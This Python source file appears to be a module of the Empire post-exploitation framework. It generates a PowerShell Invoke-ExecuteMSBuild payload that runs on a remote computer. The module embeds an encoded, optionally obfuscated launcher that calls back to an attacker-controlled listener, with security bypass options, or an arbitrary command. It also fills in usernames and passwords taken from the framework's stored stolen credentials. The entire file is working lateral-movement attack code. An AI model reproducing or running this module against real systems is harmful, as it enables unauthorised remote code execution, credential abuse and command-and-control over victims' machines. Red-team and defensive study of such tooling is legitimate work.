from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        command = params["Command"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        script_end = "Invoke-ExecuteMSBuild"
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    return handle_error_message("[!] CredID is invalid!")

                if cred.domain != "":
                    params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
                else:
                    params["UserName"] = str(cred.username)
                if cred.password != "":
                    params["Password"] = cred.password

        # Only "Command" or "Listener" but not both
        if listener_name == "" and command == "":
            return handle_error_message("[!] Listener or Command required")
        if listener_name and command:
            return handle_error_message(
                "[!] Cannot use Listener and Command at the same time"
            )

        if (
            not main_menu.listenersv2.get_active_listener_by_name(listener_name)
            and not command
        ):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        if listener_name:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")

            launcher = launcher.replace("$", "`$")
            script = script.replace("LAUNCHER", launcher)
        else:
            Cmd = command.replace('"', '`"').replace("$", "`$")
            script = script.replace("LAUNCHER", Cmd)

        # add any arguments to the end execution of the script
        script_end += " -ComputerName " + params["ComputerName"]

        if params["UserName"] != "":
            script_end += (
                ' -UserName "'
                + params["UserName"]
                + '" -Password "'
                + params["Password"]
                + '"'
            )

        if params["DriveLetter"]:
            script_end += ' -DriveLetter "' + params["DriveLetter"] + '"'

        if params["FilePath"]:
            script_end += ' -FilePath "' + params["FilePath"] + '"'

        script_end += " | Out-String"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
